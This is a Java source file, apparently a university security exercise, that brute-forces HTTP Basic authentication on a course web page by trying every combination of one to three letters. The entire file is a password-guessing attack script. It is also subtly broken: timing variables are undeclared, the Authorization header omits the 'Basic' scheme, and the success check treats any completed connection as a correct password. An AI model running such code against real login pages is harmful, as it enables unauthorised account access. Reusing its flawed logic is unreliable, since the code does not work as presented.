

import java.io.*;
import java.util.*;
import java.net.*;


public class BruteForce {

	public BruteForce() {
		
	}

	public static void main(String[] args) {

	String[] validPW = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
			"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
			"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
			"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" };

	String attackWP = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";
	String userID = "";
	int trytimes = 0;
	int count=52;
	String userPassword="";
	try {
		 startmillisecond = System.currentTimeMillis();
	
		for (int i = 0; i < count; i++) {
                  for (int j = 0; j < count; j++) {
                    for (int k = 0; k < count; k++) {
			trytimes ++;
			userPassword = userID + ":" + validPW[i] + validPW[j] + validPW[k];
			int attackOK = new BruteForce().attackURL(userPassword, attackWP);
			if (attackOK == 1) {
				 endmillisecond = System.currentTimeMillis();
				 searchmillisecond = endmillisecond - startmillisecond;
				System.out.println("Match in " + searchmillisecond + " milliseconds ");
				System.out.println("Try " + trytimes + " times ");
				System.exit(1);
			}
		    }
		  }
		}
	
		for (int i = 0; i < count; i++) {
                  for (int j = 0; j < count; j++) {
			trytimes ++;
			userPassword = userID + ":" + validPW[i] + validPW[j];
			int attackOK = new BruteForce().attackURL(userPassword, attackWP);
			if (attackOK == 1) {
				 endmillisecond = System.currentTimeMillis();
				 searchmillisecond = endmillisecond - startmillisecond;
				System.out.println("Match in " + searchmillisecond + " milliseconds ");
				System.out.println("Try " + trytimes + " times ");
				System.exit(1);
			}
		  }
		}
	
		for (int i = 0; i < count; i++) {
			userPassword = userID + ":" + validPW[i];
			trytimes ++;
			int attackOK = new BruteForce().attackURL(userPassword, attackWP);
			if (attackOK == 1) {
				 endmillisecond = System.currentTimeMillis();
				 searchmillisecond = endmillisecond - startmillisecond;
				System.out.println("Match in " + searchmillisecond + " milliseconds ");
				System.out.println("Try " + trytimes + " times ");
				System.exit(1);
			}
		}
	}
	catch (Exception ioe) {
            System.out.println(ioe.getMessage());
        }
        finally {
        }
	}
	
	public int attackURL(String userPassword, String attackWP) {
		int rtn = 1;
		try {
		        URL url = new URL(attackWP);
			System.out.println("User & Password :" + userPassword);
		        String encoding = Base64Converter.encode (userPassword.getBytes());
			
			URLConnection uc = url.openConnection();
			uc.setRequestProperty  ("Authorization", " " + encoding);
			InputStream content = (InputStream)uc.getInputStream();
			BufferedReader in = new BufferedReader (new InputStreamReader (content));
			String line;
			while ((line = in.readLine()) != null) {
			
				System.out.println(line);
		        }
		} catch (MalformedURLException e) {
			rtn = 2;
	       		System.out.println("Invalid URL");
		} catch (IOException e) {
      			System.out.println("Error  URL");
			rtn = 2;
		}
		return rtn;
	}

}
